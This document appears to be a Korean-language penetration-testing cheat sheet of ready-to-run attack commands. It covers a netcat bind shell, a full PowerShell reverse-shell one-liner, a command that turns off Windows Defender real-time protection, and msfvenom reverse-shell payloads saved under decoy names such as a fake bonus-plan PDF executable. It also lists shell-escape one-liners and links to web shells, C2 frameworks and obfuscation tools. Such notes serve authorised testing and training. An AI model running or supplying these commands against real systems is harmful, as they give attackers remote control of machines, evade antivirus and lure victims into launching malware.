# 1.Bind Shells

### 서버 - Bash 셸을 TCP 세션에 바인딩
```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 192.168.1.1 7777 > /tmp/f```<br/>
```nc -nv 192.168.1.1 7777```

<br/><br/>
# 2.Reverse Shell

### 클라이언트 - PowerShell을 사용하여 연결
```nc -lvnp 443```<br/>
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Windows Defender 비활성화(PowerShell 연결 차단될 경우)
```Set-MpPreference -DisableRealtimeMonitoring $true```

<br/><br/>
# 3.Payload

### MSFvenom Payload 제작 (Linux용)
```msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > createbackup.elf```

### MSFvenom Payload 제작 (Windows용)
```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > BonusCompensationPlanpdf.exe```

### Search Exploit
```searchsploit 50064.rd```<br/>
경로 출력) ```searchsploit -p 50064.rd```


### Payload 생성 Resource
| **Resource**                            | **설명**                                                                                                                                                                                      |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [소스](https://github.com/rapid7/metasploit-framework) MSF는 모든 펜테스터 툴킷에 매우 다재다능한 도구입니다. 호스트를 열거하고, 페이로드를 생성하고, 공개 및 사용자 지정 익스플로잇을 활용하고, 호스트에서 익스플로잇 후 작업을 수행하는 방법으로 사용됩니다. 스위스 군용 칼이라고 생각하세요. |
| `Payloads All The Things`         | [소스](https://github.com/swisskyrepo/PayloadsAllTheThings) 여기에서는 페이로드 생성과 일반적인 방법론에 대한 다양한 리소스와 치트 시트를 찾을 수 있습니다.                                                                            |
| `Mythic C2 Framework`             | [소스](https://github.com/its-a-feature/Mythic) Mythic C2 프레임워크는 Metasploit에 대한 대안으로, 고유한 페이로드 생성을 위한 명령 및 제어 프레임워크이자 툴박스입니다.                                                                 |
| `Nishang`                         | [소스](https://github.com/samratashok/nishang) 니샹은 Offensive PowerShell 임플란트와 스크립트의 프레임워크 컬렉션입니다. 여기에는 모든 펜테스터에게 유용할 수 있는 많은 유틸리티가 포함되어 있습니다.                                                 |
| `Darkarmour`                      | [소스](https://github.com/bats3c/darkarmour) Darkarmour는 Windows 호스트를 상대로 사용하기 위해 난독화된 바이너리를 생성하고 활용하는 도구입니다.                                                                                 |

### TTY 쉘 생성
```python -c 'import pty; pty.spawn("/bin/sh")'```

### 대화형 쉘(python 없는 경우)
```/bin/sh -i```<br/>
```perl —e 'exec "/bin/sh";'```<br/>
```perl: exec "/bin/sh";```<br/>
```ruby: exec "/bin/sh"```<br/>
```lua: os.execute('/bin/sh')```<br/>
```awk 'BEGIN {system("/bin/sh")}'```<br/>
```find . -exec /bin/sh \; -quit```<br/>
```vim -c ':!/bin/sh'```

### sudo 권한 확인
```sudo -l```

<br/><br/>
# 4.WebShell

### Laudanum (all)
[Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) ```/usr/share/laudanum/```

### Antak Webshell (aspx)
[Nishang Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell) ```/usr/share/nishang/Antak-WebShell```

### wwwolf-php-webshell (php)
[WhiteWinterWolf PHP Webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
